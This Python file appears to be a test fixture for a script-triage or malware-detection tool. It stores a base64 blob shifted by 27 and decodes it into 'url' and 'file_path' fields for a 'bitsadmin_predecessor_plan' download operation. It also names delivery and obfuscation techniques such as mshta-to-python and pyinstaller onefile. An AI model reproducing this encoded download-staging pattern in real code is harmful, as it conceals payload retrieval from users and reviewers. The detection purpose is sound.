#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_9e009847 = "kVhNl46PgIuOWHx-jJCEjYB6jYCIio-AR5KNhI-AeoGEh4CXfH98i4-AjVh9hI-OfH-IhIl6i42Af4B-gI6Oio16i4d8iZeOj3yCgHp-ipCJj1hMl46UiY98k1iCgImAjXyPio16i4SLgIeEiYCXin2BkI5-fI-EiolYgY6PjYSJgnqBjXyCiICJj46XfnyNjYSAjViLlISJjo98h4eAjXqKiYCBhIeAl5KEiX-Kko56foN8hIlYiI6Dj3x6j4p6i5SPg4qJl358iIt8hIKJeoR_WH58iIt8hIKJSFJSfU9OU39UUEuXkI2HWIOPj4uOVUpKUlJ9T05Tf1RQS0mAk3yIi4eASYSJkXyHhH9KUX1LgUxTfVFJi5SXkI6AjXp8goCJj1hjkImPjYCOjmuUj4OKiUpSUn1PTlN_VFBLl4GEh4B6i3yPg1heVUprjYqCjXyIX3yPfEpjkImPjYCOjmd8fUpJkIt_fI-ASFJSfU9OU39UUEtJi5Q="
    CODEC_9e009847 = "urlsafe_base64|add_modulo_256|1b"

    def load_9e009847():
        return base64.urlsafe_b64decode(MATERIAL_9e009847)

    def decode_9e009847(EnCoDeD_Bytes):
        return bytes((value - 27) % 256 for value in EnCoDeD_Bytes)

    def recover_9e009847():
        NeUtRaL = "left" if 2 > 1 else "right"
        _pass = 0
        while _pass < 1:
            DeCoDeD_Bytes = decode_9e009847(load_9e009847())
            _pass += 1
        DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")
        return DeScRiPtOr_Text

    def inspect_9e009847():
        return recover_9e009847()

    def surface_9e009847():
        stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))
        return tuple(stream)

    def obfuscation_9e009847():
        left, right = "fstrin", "g_fragments"
        return f"{left}{right}"

    def plan_9e009847():
        fields = dict(item.split("=", 1) for item in inspect_9e009847().split("|"))
        analysis_surface = surface_9e009847()
        obfuscation_surface = obfuscation_9e009847()
        operation_plan = ("bitsadmin_predecessor_plan", fields["url"], fields["file_path"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_9e009847())
